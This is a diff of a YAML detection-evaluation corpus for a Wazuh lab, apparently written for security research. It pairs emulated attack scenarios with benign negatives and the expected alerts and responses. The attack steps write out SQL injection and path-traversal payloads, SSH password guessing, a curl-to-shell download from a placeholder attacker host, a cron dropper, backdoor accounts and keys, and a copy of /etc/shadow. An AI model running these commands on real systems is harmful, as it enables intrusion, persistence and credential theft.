@@ -1,138 +1,218 @@
-# Detection corpus for Chapter 5 (Section 5.1, Table 5.1).
+# Detection corpus (evaluation set). Scored by RUBRIC.md, which was committed
+# together with this file and before any evaluation run.
 #
 # Each scenario is run `reps` times on the lab endpoint. A run's window opens
-# just before the first step and closes `settle_s` seconds after the last, and
-# every Wazuh alert on the endpoint inside that window is attributed to the run.
-# Ground truth is the scenario label: windows of malicious scenarios are
-# positives, windows of benign scenarios are negatives.
+# just before the first step and closes `settle_s` seconds after the last.
+# Ground truth is the scenario label; the alert the investigation starts from
+# is the scenario's own `expected_rules` alert when one fired (pick_trigger).
+#
+# Outcome definitions per scenario:
+#   respond       remediations that are a correct response. The scripted
+#                 analyst approves a proposal only if it matches one of these.
+#   escalate_ok   true when `escalate` (flag to an analyst with relevant
+#                 evidence, change nothing) is a correct, safe outcome.
+#   Benign scenarios: the correct outcome is no analyst-facing proposal
+#   (enrich, or nothing proposed).
 #
 # Steps run as root over SSM, on the endpoint unless `on: attacker`.
-# `atomic` steps call Invoke-AtomicTest with the named test; prerequisites are
-# fetched first and the test's own cleanup runs after the window closes.
+# `atomic` steps call Invoke-AtomicTest; prerequisites are fetched first and
+# the test's cleanup runs after the window closes.
 # Placeholders: {endpoint_ip}, {attacker_ip}, {manager_ip}.
 
 reps: 3
 settle_s: 60
 
 scenarios:
-  - id: T1110.001-ssh-bruteforce
+  # --- attacks from the attacker box -------------------------------------
+  - id: A01-ssh-password-guessing
     technique: T1110.001
-    name: SSH password guessing against non-existent accounts
+    name: SSH password guessing against a list of service accounts
     malicious: true
-    expected_rules: ["5710", "5712"]
-    acceptable: [{action: block_ip, target: "{attacker_ip}"}]
+    expected_rules: ["5712", "5710"]
+    respond: [{action: block_ip, target: "{attacker_ip}"}]
+    escalate_ok: true
     steps:
       - on: attacker
         cmd: |
-          for u in admin oracle test guest postgres ftp backup deploy git ubuntu1; do
+          for u in svc_backup jenkins nagios zabbix ansible tomcat elastic redis minio vault grafana kafka; do
             ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
                 -o PreferredAuthentications=password -l "$u" {endpoint_ip} true || true
           done
-    success: rule 5712 (brute force) fires on the endpoint
+    success: rule 5712 (sshd brute force) fires on the endpoint
 
-  - id: T1136.001-local-account
+  - id: A02-web-path-probing
+    technique: T1595.003
+    name: Wordlist probing of web paths
+    malicious: true
+    expected_rules: ["31151", "31101"]
+    respond: [{action: block_ip, target: "{attacker_ip}"}]
+    escalate_ok: true
+    steps:
+      - on: attacker
+        cmd: |
+          for p in .env .git/config wp-login.php phpmyadmin/ admin/config.php backup.zip \
+                   server-status actuator/env api/v1/users .aws/credentials config.json \
+                   db.sql; do
+            curl -s -o /dev/null "http://{endpoint_ip}/$p"
+          done
+    success: rule 31151 (multiple 400-class errors from one source) fires
+
+  - id: A03-sql-injection-probes
+    technique: T1190
+    name: SQL injection probes against the web server
+    malicious: true
+    expected_rules: ["31103", "31152", "31164"]
+    respond: [{action: block_ip, target: "{attacker_ip}"}]
+    escalate_ok: true
+    steps:
+      - on: attacker
+        cmd: |
+          for q in "id=1%27%20OR%20%271%27=%271" "id=1%20UNION%20SELECT%20username,password%20FROM%20users" \
+                   "q=%27;%20DROP%20TABLE%20users;--" "id=1%20AND%20SLEEP(5)" \
+                   "cat=1%27%20UNION%20ALL%20SELECT%20NULL,NULL--"; do
+            curl -s -o /dev/null "http://{endpoint_ip}/products.php?$q"
+          done
+    success: a web SQL injection rule (31103 or 31152) fires
+
+  - id: A04-path-traversal
+    technique: T1190
+    name: Path traversal attempts against the web server
+    malicious: true
+    expected_rules: ["31104", "31101"]
+    respond: [{action: block_ip, target: "{attacker_ip}"}]
+    escalate_ok: true
+    steps:
+      - on: attacker
+        cmd: |
+          for p in "../../../../etc/passwd" "..%2f..%2f..%2fetc%2fshadow" \
+                   "static/..%252f..%252f..%252fetc/hosts" "cgi-bin/../../../../bin/sh"; do
+            curl -s --path-as-is -o /dev/null "http://{endpoint_ip}/$p"
+          done
+    success: rule 31104 (common web attack) fires
+
+  - id: A05-download-and-run
+    technique: T1105
+    name: Script fetched from the attacker host and run as root
+    malicious: true
+    expected_rules: ["80792"]
+    respond: [{action: block_ip, target: "{attacker_ip}"}]
+    escalate_ok: true
+    steps:
+      - on: attacker
+        cmd: |
+          mkdir -p /tmp/srv && printf '#!/bin/sh\necho stage2 > /tmp/.stage2\n' > /tmp/srv/s.sh
+          nohup timeout 300 python3 -m http.server 8080 -d /tmp/srv >/dev/null 2>&1 &
+          sleep 2
+      - cmd: curl -fsS -o /tmp/.s.sh http://{attacker_ip}:8080/s.sh && sh /tmp/.s.sh
+    cleanup: rm -f /tmp/.s.sh /tmp/.stage2
+    success: an audit command alert for the download from the attacker fires
+
+  # --- attacks on the endpoint itself -------------------------------------
+  - id: A06-local-account-created
     technique: T1136.001
-    name: Create a local account
+    name: Local account created for persistence
     malicious: true
     expected_rules: ["5902"]
-    acceptable: [{action: disable_account, target: "evil_user"}]
+    respond: [{action: disable_account, target: "svc-updates"}]
+    escalate_ok: true
     steps:
-      - atomic: {technique: T1136.001, test_name: "Create a user account on a Linux system"}
+      - cmd: useradd -M -s /bin/bash svc-updates
+    cleanup: userdel svc-updates || true
     success: rule 5902 (new user added) fires
 
-  - id: T1003.008-shadow-read
-    technique: T1003.008
-    name: Read /etc/shadow
+  - id: A07-authorized-keys-user
+    technique: T1098.004
+    name: SSH key added for a regular user
     malicious: true
-    expected_rules: ["80784", "80792"]
-    acceptable: []
+    expected_rules: ["554", "550"]
+    respond: []
+    escalate_ok: true
     steps:
-      - atomic: {technique: T1003.008, test_name: "Access /etc/shadow (Local)"}
-    success: an audit read-watch alert on /etc/shadow fires
+      - cmd: |
+          mkdir -p /home/ubuntu/.ssh
+          echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEvalSetKeyA07ForTheLabOnly0000000000000 ops@build-7" >> /home/ubuntu/.ssh/authorized_keys
+    cleanup: sed -i '/ops@build-7$/d' /home/ubuntu/.ssh/authorized_keys
+    success: realtime FIM reports /home/ubuntu/.ssh/authorized_keys changed
 
-  - id: T1053.003-cron
+  - id: A08-cron-dropper
     technique: T1053.003
-    name: Cron persistence
+    name: Cron job that fetches and runs a remote script
     malicious: true
-    expected_rules: ["550", "554"]
-    acceptable: []
+    expected_rules: ["554", "550"]
+    respond: [{action: block_ip, target: "{attacker_ip}"}]
+    escalate_ok: true
     steps:
-      - atomic: {technique: T1053.003, test_name: "Cron - Add script to all cron subfolders"}
-    success: realtime FIM reports a file added or changed under /etc/cron*
+      - cmd: echo '*/5 * * * * root curl -fsS http://{attacker_ip}:8080/s.sh | sh' > /etc/cron.d/sys-update
+    cleanup: rm -f /etc/cron.d/sys-update
+    success: realtime FIM reports /etc/cron.d/sys-update added
 
-  - id: T1543.002-systemd-service
+  - id: A09-systemd-backdoor
     technique: T1543.002
     name: Systemd service persistence
     malicious: true
-    expected_rules: ["550", "554"]
-    acceptable: []
+    expected_rules: ["554", "550"]
+    respond: []
+    escalate_ok: true
     steps:
-      - atomic: {technique: T1543.002, test_name: "Create Systemd Service"}
+      - cmd: |
+          printf '[Unit]\nDescription=Network health\n[Service]\nExecStart=/bin/sh -c "sleep infinity"\n[Install]\nWantedBy=multi-user.target\n' > /etc/systemd/system/net-health.service
+    cleanup: rm -f /etc/systemd/system/net-health.service
     success: realtime FIM reports a unit file added under /etc/systemd/system
 
-  - id: T1098.004-authorized-keys
-    technique: T1098.004
-    name: SSH authorized_keys persistence
+  - id: A10-shadow-copy
+    technique: T1003.008
+    name: Copy of /etc/shadow to a hidden file
     malicious: true
-    expected_rules: ["550", "554"]
-    acceptable: []
+    expected_rules: ["80784", "80792"]
+    respond: []
+    escalate_ok: true
     steps:
-      - cmd: |
-          mkdir -p /root/.ssh
-          echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEmulatedT1098004KeyForTheLabOnly lab-attacker" >> /root/.ssh/authorized_keys
-    cleanup: sed -i '/lab-attacker$/d' /root/.ssh/authorized_keys
-    success: realtime FIM reports /root/.ssh/authorized_keys modified
+      - cmd: cp /etc/shadow /tmp/.cache-s && chmod 644 /tmp/.cache-s
+    cleanup: rm -f /tmp/.cache-s
+    success: an audit read-watch alert on /etc/shadow fires
 
-  - id: T1070.003-clear-history
-    technique: T1070.003
-    name: Clear shell history
-    malicious: true
-    expected_rules: ["80792"]
-    acceptable: []
-    steps:
-      - atomic: {technique: T1070.003, test_name: "Clear Bash history (rm)"}
-    success: an audit command alert for the history removal fires
-
-  - id: T1105-ingress-tool
-    technique: T1105
-    name: Ingress tool transfer
-    malicious: true
-    expected_rules: ["80792"]
-    acceptable: []
-    steps:
-      - cmd: |
-          curl -fsSL -o /tmp/T1105-tool.sh https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
-          chmod +x /tmp/T1105-tool.sh
-    cleanup: rm -f /tmp/T1105-tool.sh
-    success: an audit command alert for the download fires
-
-  # --- benign administration (negatives) ---------------------------------
-  - id: benign-apt-update
+  # --- benign activity (negatives) ----------------------------------------
+  - id: B01-package-refresh
     name: Package index refresh
     malicious: false
     steps:
       - cmd: apt-get update -q
-    success: no remediation proposed
+    success: no analyst-facing proposal
 
-  - id: benign-service-restart
-    name: Restart a web service
+  - id: B02-service-restart
+    name: Restart the web service
     malicious: false
     steps:
       - cmd: systemctl restart nginx
-    success: no remediation proposed
+    success: no analyst-facing proposal
 
-  - id: benign-web-browse
-    name: Normal web requests from a known client
+  - id: B03-normal-browsing
+    name: Normal requests for existing pages
     malicious: false
     steps:
       - on: attacker
-        cmd: for p in / /index.nginx-debian.html /; do curl -s -o /dev/null http://{endpoint_ip}$p; done
-    success: no remediation proposed
+        cmd: for p in / /index.nginx-debian.html / /index.nginx-debian.html; do curl -s -o /dev/null http://{endpoint_ip}$p; done
+    success: no analyst-facing proposal
 
-  - id: benign-config-edit
-    name: Administrator edits a monitored config file
+  - id: B04-single-mistyped-login
+    name: One failed SSH login with a mistyped user name
     malicious: false
     steps:
-      - cmd: echo "# reviewed $(date -Is)" >> /etc/crontab
-    cleanup: sed -i '/^# reviewed /d' /etc/crontab
-    success: no remediation proposed
+      - on: attacker
+        cmd: ssh -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 -l ubuntuu {endpoint_ip} true || true
+    success: no analyst-facing proposal
+
+  - id: B05-log-rotation
+    name: Forced log rotation
+    malicious: false
+    steps:
+      - cmd: logrotate -f /etc/logrotate.d/nginx
+    success: no analyst-facing proposal
+
+  - id: B06-admin-config-edit
+    name: Administrator edits a monitored cron file
+    malicious: false
+    steps:
+      - cmd: echo "# reviewed by ops $(date -Is)" >> /etc/crontab
+    cleanup: sed -i '/^# reviewed by ops /d' /etc/crontab
+    success: no analyst-facing proposal
